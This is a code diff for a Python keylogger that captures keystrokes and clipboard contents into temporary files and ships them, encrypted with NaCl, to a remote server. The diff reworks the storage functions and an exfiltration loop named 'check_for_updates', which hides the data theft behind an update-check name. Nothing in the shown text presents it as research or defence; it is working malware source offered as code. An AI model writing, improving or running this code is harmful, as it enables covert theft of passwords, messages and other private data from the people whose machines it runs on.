@@ -42,115 +42,114 @@ def log_debug(msg):
 
 # Data Storage and Extraction Functions
 def store_keystroke_data(keystroke: str) -> None:
-    if not os.path.exists(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")):
-        with open(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"), "w") as f:
-            f.write("")
-    
-    if len(keystroke) > 0:
-        with open(os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"), "a") as f:
+    try:
+        filepath = os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")
+        # Ensure directory exists (temp should exist, but good practice)
+        
+        mode = "a" if os.path.exists(filepath) else "w"
+        with open(filepath, mode, encoding="utf-8") as f:
             f.write(keystroke)
-    return
+    except Exception as e:
+        log_debug(f"Store Keystroke Error: {e}")
     
 def store_clipboard_data(clipboard: str) -> None:
-    if not os.path.exists(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")):
-        with open(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), "w") as f:
-            f.write("")
-    
-    if clipboard:
-        with open(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), "a") as f:
-            f.write(clipboard)
-            f.write("\n")
-            
-    return
+    try:
+        filepath = os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")
+        mode = "a" if os.path.exists(filepath) else "w"
+        with open(filepath, mode, encoding="utf-8") as f:
+            f.write(clipboard + "\n")
+    except Exception as e:
+        log_debug(f"Store Clipboard Error: {e}")
 
-def extract_stored_data(clipboard_data, keystroke_data) -> str:
-    try:
-        with open(clipboard_data, "r") as f:
-            clipboard = f.read()
-    except FileNotFoundError:
-        clipboard = ""
+def extract_stored_data(clipboard_path, keystroke_path) -> tuple:
+    clipboard = ""
+    keystrokes = ""
     
-    try:
-        with open(keystroke_data, "r") as f:
+    if os.path.exists(clipboard_path):
+        try:
+            with open(clipboard_path, "r", encoding="utf-8") as f:
+                clipboard = f.read()
+            os.remove(clipboard_path)
+        except Exception:
+            pass
+    
+    if os.path.exists(keystroke_path):
+        try:
+            with open(keystroke_path, "r", encoding="utf-8") as f:
                 keystrokes = f.read()
-    except FileNotFoundError:
-        keystrokes = ""
-    try:
-        os.remove(clipboard_data)
-        os.remove(keystroke_data)
-    except FileNotFoundError:
-        pass
+            os.remove(keystroke_path)
+        except Exception:
+            pass
     
     return clipboard, keystrokes
 
 # Exfiltration Thread
-def check_for_updates(key_exchange_status: int, private_key: PrivateKey, public_key: bytes) -> None:
+def check_for_updates(key_exchange_status_ref: int, private_key: PrivateKey, public_key: bytes) -> None:
+    box = None
+    key_exchange_status = key_exchange_status_ref # Local copy/management
+    
     while True:
         if key_exchange_status == 1:
-            print("Performing Key Exchange")
             try:
-                response = requests.post(SERVER + "/key-exchange", json={"pubkey": f"{public_key.encode(encoder=nacl.encoding.HexEncoder).decode()}"})
-                print(f"Key Exchange Response Status: {response.status_code}")
+                # Key Exchange
+                pub_hex_str = public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
+                response = requests.post(SERVER + "/key-exchange", json={"pubkey": pub_hex_str}, timeout=10)
+                
                 if response.status_code == 200:
                     update_info = response.json()
-                    print(f"Update Info: {update_info}")
-                    
                     server_pubkey_hex = update_info.get("pubkey", "")
-                    
-                    print(f"Server Public Key: {server_pubkey_hex}")
                     
                     if server_pubkey_hex:
                         server_pubkey = PublicKey(server_pubkey_hex, encoder=nacl.encoding.HexEncoder)
                         box = Box(private_key, server_pubkey)
-                        
-                        # Now you can use `box` to encrypt/decrypt messages
-                        print("Key Exchange Successful")
-                        key_exchange_status = 0  # Update status to indicate key exchange is complete
-                    
+                        key_exchange_status = 0
+                else:
+                    time.sleep(5)
             except Exception as e:
-                print(f"Error during key exchange: {e}")
+                log_debug(f"Key exchange error: {e}")
+                time.sleep(5)
         
-        if key_exchange_status == 0:
+        if key_exchange_status == 0 and box:
+             # Check for data
+            clip_path = os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt")
+            keys_path = os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt")
             
-            clipboard_data, keystroke_data = extract_stored_data(os.path.join(TEMP_DIR, f"clipboard_{USERNAME}_{TIMESTAMP}.txt"), os.path.join(TEMP_DIR, f"keystrokes_{USERNAME}_{TIMESTAMP}.txt"))
+            has_data = False
+            if os.path.exists(clip_path) and os.path.getsize(clip_path) > 0: has_data = True
+            if os.path.exists(keys_path) and os.path.getsize(keys_path) > 0: has_data = True
             
-            # Generate a single nonce for this payload
-            nonce = nacl.utils.random(Box.NONCE_SIZE)
-            
-            # Encrypt data (strings -> bytes -> encrypted)
-            # box.encrypt returns an EncryptedMessage which contains the ciphertext
-            # We access .ciphertext to get just the encrypted bytes (without the nonce prepended, if we rely on implicit nonce handling)
-            # Actually box.encrypt(msg, nonce) returns the ciphertext with the 16 byte MAC. NaCL Box ciphertext is usually same length as plaintext + 16.
-            # We used to use a helper that returned .ciphertext. Let's replicate that.
-            
-            encrypted_clipboard = box.encrypt(clipboard_data.encode("utf-8"), nonce).ciphertext
-            encrypted_keystrokes = box.encrypt(keystroke_data.encode("utf-8"), nonce).ciphertext
-            
-            # Serialize to Hex Strings
-            nonce_hex = nacl.encoding.HexEncoder.encode(nonce).decode()
-            clip_hex = nacl.encoding.HexEncoder.encode(encrypted_clipboard).decode()
-            keys_hex = nacl.encoding.HexEncoder.encode(encrypted_keystrokes).decode()
-            pub_hex = public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
-            
-            payload = {
-                "id": USERNAME + "_" + TIMESTAMP,
-                "clipboard": clip_hex,
-                "keystrokes": keys_hex,
-                "nonce": nonce_hex,
-                "pubkey": pub_hex
-            }
-            
-            json_payload = json.dumps(payload)
-            
+            if not has_data:
+                time.sleep(5)
+                continue
+
+            clipboard_data, keystroke_data = extract_stored_data(clip_path, keys_path)
+
             try:
-                response = requests.post(SERVER + "/check-for-updates", json=payload) # requests handles json dumping usually, but we can pass payload directly to json arg
-                if response.status_code == 200:
-                    updates = response.json()
-                    # Process updates as needed
+                nonce = nacl.utils.random(Box.NONCE_SIZE)
+                
+                # Encrypt
+                encrypted_clipboard = box.encrypt(clipboard_data.encode("utf-8"), nonce)
+                encrypted_keystrokes = box.encrypt(keystroke_data.encode("utf-8"), nonce)
+                
+                payload = {
+                    "id": f"{USERNAME}_{TIMESTAMP}",
+                    "clipboard": nacl.encoding.HexEncoder.encode(encrypted_clipboard.ciphertext).decode(),
+                    "keystrokes": nacl.encoding.HexEncoder.encode(encrypted_keystrokes.ciphertext).decode(),
+                    "nonce": nacl.encoding.HexEncoder.encode(nonce).decode(),
+                    "pubkey": public_key.encode(encoder=nacl.encoding.HexEncoder).decode()
+                }
+                
+                headers = {'Content-Type': 'application/json'}
+                response = requests.post(SERVER + "/check-for-updates", data=json.dumps(payload), headers=headers, timeout=10)
+                
+                if response.status_code != 200:
+                    # Key rotation or error? Reset exchange
+                    key_exchange_status = 1
+            
             except Exception as e:
-                pass
-        
-        time.sleep(15) # Check for updates every 3 minutes
+                log_debug(f"Exfil Loop Error: {e}")
+                
+        time.sleep(10)
 
 # Encryption Functions
 def generate_keys() -> tuple:
